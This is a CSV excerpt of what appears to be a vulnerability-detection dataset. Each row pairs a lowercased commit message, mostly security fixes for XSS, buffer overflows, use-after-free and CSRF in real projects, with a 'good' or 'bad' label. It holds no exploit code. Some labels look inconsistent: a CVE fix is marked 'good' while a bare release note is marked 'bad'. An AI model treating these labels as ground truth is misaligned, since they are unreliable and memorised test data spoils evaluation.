"";"index";"all_text";"vuln"
"111";"517";"delete cmd php";"bad"
"112";"6193";"add csrf protection to html_button function generally only post request to the server need to have csrf protection a they re the only one which should be changing data";"bad"
"113";"5685";"fix fix to a potential reflected x on the quickdelete low impact x required user confirmation of malicious payload a reported by or hanuka palantir";"bad"
"114";"4451";"security fix";"bad"
"115";"8991";"merge pull request 288 from markusbeth lgtm_fixes lgtm fix";"good"
"116";"11337";"fixed wrong data_maximum calcluation prevent out of buffer in exp_bef";"good"
"117";"1025";"avoid loading module from relative path in inc for text diff etc also reported by john lightsey";"bad"
"118";"4855";"security fix issue 162 for cve 2013 2023";"bad"
"119";"5729";"merge branch 4 2 4 2 fix x issue in the form theme of the php templating engine";"bad"
"120";"594";"lib check frame_size is int32_max when parsing a frame header validate that the frame_size is le than or equal to int32_max given frame_max is limited between 0 and int32_max in amqp_login and friend this doe not change the api this prevents a potential buffer overflow when a malicious client sends a frame_size that is close to uint32_max in which cause an overflow when computing state target_size resulting in a small value there a buffer is then allocated with the small amount then memcopy copy the frame_size writing to memory beyond the end of the buffer";"bad"
"121";"467";"release 3 17 14 190902";"bad"
"122";"9061";"pcd decoder overrun the shuffle buffer fix 568";"good"
"123";"12005";"x86_64 trap fix the espfix64 df fixup and rewrite it in c there s nothing special enough about the espfix64 double fault fixup to justify writing it in assembly move it to c this also fix a bug if the double fault came from an ist stack the old asm code would return to a partially uninitialized stack frame fix 3891a04aafd668686239349ea58f3314ea2af86b signed off by andy lutomirski luto amacapital net reviewed by thomas gleixner tglx linutronix de cc stable vger kernel org signed off by linus torvalds torvalds linux foundation org";"good"
"124";"12539";"merge pull request 1154 from greezybacon issue 1144 oops fix incorrectly placed header line reviewed by peter rotich peter osticket com";"good"
"125";"6312";"fixed possible x in the translation grid";"bad"
"126";"11404";"mm fix null pointer dereference in wait_iff_congested an unintended consequence of commit 4ae0a48b5efc mm modify pgdat_balanced so that it also handle order 0 is that wait_iff_congested can now be called with null struct zone producing kernel oops like this bug unable to handle kernel null pointer dereference ip ffffffff811542d9 wait_iff_congested 0x59 0x140 this trivial patch fix it reported by zhouping liu zliu redhat com reported and tested by sedat dilek sedat dilek gmail com cc andrew morton akpm linux foundation org cc mel gorman mgorman suse de cc hugh dickins hughd google com signed off by zlatko calusic zlatko calusic iskon hr signed off by linus torvalds torvalds linux foundation org";"good"
"127";"235";"added validation of input color code";"bad"
"128";"11376";"kcore add kconfig help text under pseudo filesystems proc kcore support ha no help fix a portion of kernel bugzilla 52671 http bugzilla kernel org show_bug cgi id 52671 thanks for david howells for the help text signed off by randy dunlap rdunlap infradead org reported by lailavrazda1979 gmail com signed off by david howells dhowells redhat com signed off by andrew morton akpm linux foundation org signed off by linus torvalds torvalds linux foundation org";"good"
"129";"7522";"merge pull request 26 from project pier remove lauguages removing language translation file from core repository because they are now located in the projectpier translation repo";"good"
"130";"5466";"kvm x86 don t report guest userspace emulation error to userspace commit fc3a9157d314 kvm x86 don t report l2 emulation failure to user space disabled the reporting of l2 nested guest emulation failure to userspace due to race condition between a vmexit and the instruction emulator the same rational applies also to userspace application that are permitted by the guest o to access mmio area or perform pio this patch extends the current behavior of injecting a ud instead of reporting it to userspace also for guest userspace code signed off by nadav amit namit c technion ac il signed off by paolo bonzini pbonzini redhat com";"bad"
"131";"11934";"weld 1802 requestscopedcache testcase";"good"
"132";"3937";"cve 2017 13025 ipv6 mobility add a bound check before fetching data this fix a buffer over read discovered by bhargava shastry sect tu berlin add a test using the capture file supplied by the reporter s modified so the capture file won t cause tcpdump pcap_loop truncated dump file";"bad"
"133";"9101";"build fix";"good"
"134";"568";"fetch map after dgifgetimagedesc earlier refactoring broke gif map fetch";"bad"
"135";"7366";"merge pull request 38 from jrohel fix missing_braces fix missing brace";"good"
"136";"1772";"merge pull request 212 from aviadatsnyk master fix prevent extracting archived file outside of target path credit to snyk security research team for disclosure and fixing the issue";"bad"
"137";"7052";"merge branch 2 4 of github com misp misp into 2 4";"good"
"138";"8996";"fix added missing space between the password and the info icon my ocd demand it";"good"
"139";"10158";"fix entity filter";"good"
"140";"8543";"fix 1737 on 2 6 1945";"good"
"141";"10319";"direct io prevent null pointer access in submit_page_section in the code added to function submit_page_section by commit b1058b981 sdio bio can currently be null when calling dio_bio_submit this then lead to a null pointer access in dio_bio_submit so check for a null bio in submit_page_section before trying to submit it instead fix xfstest generic 250 on gfs2 cc stable vger kernel org v3 10 signed off by andreas gruenbacher agruenba redhat com reviewed by jan kara jack suse cz signed off by al viro viro zeniv linux org uk";"good"
"142";"8844";"fixed msvc warning";"good"
"143";"9415";"netfilter x_tables check standard target size too we have target and standard target the latter carry a verdict the ip ip6tables validation function will access t verdict for the standard target to fetch the jump offset or verdict for chainloop detection but this happens before the target get checked validated thus we also need to check for verdict presence here else t verdict can point right after a blob spotted with ubsan while testing malformed blob signed off by florian westphal fw strlen de signed off by pablo neira ayuso pablo netfilter org";"good"
"144";"7257";"fix a crash that could occur if a sub select that us both distinct and window function also used an order by that is the same a it select list fossilorigin name bcdd66c1691955c697f3d756c2b035acfe98f6aad72e90b0021bab6e9023b3ba";"good"
"145";"8899";"security cve 2018 5711 sec bug 75571 potential infinite loop in gdimagecreatefromgifctx cve 2018 5711";"good"
"146";"6341";"fix name protocol x in controlcaps php fix 2445 2479";"bad"
"147";"5362";"fix x in pma_recentfavoritetable gethtmllist signed off by ann j m phpmyadmin zweisteinsoft de";"bad"
"148";"10095";"linux 2 6 39 rc2";"good"
"149";"3184";"usb gadget f_fs fix use after free when using asynchronous read or write operation on the usb endpoint the issuer of the io request is notified by calling the ki_complete callback of the submitted kiocb when the urb ha been completed calling this ki_complete callback will free kiocb make sure that the structure is no longer accessed beyond that point otherwise undefined behaviour might occur fix 2e4c7553cd6f usb gadget f_fs add aio support cc stable vger kernel org v3 15 signed off by lars peter clausen lars metafoo de signed off by felipe balbi felipe balbi linux intel com";"bad"
"150";"35";"bug fix";"bad"
"151";"11602";"change default lifetime for dynamic client from 1d to 1h";"good"
"152";"1366";"issue 211 escape cv subdir last modified file name";"bad"
"153";"318";"fix database fix 151 thx miaochiahao";"bad"
"154";"8809";"non enclave dependent encrypt decrypt 65 add encrypt and decrypt util function to remove client side enclave dependency when encrypting and decrypting reorder outputted cipher in enclave crypto function to match java s ordering wa previously iv mac data is now iv data mac co authored by ankurdave fix 37 wip on 64";"good"
"155";"11896";"for the test we need dc";"good"
"156";"10072";"l10n updated portuguese brazilian pt_br translation to 100 new status 679 message complete with 0 fuzzies and 0 untranslated transmitted via transifex translation xfce org";"good"
"157";"5304";"ecdh downgrade bug fix fix bug where an openssl client would accept a handshake using an ephemeral ecdh ciphersuites with the server key exchange message omitted thanks to karthikeyan bhargavan for reporting this issue cve 2014 3572 reviewed by matt caswell matt openssl org";"bad"
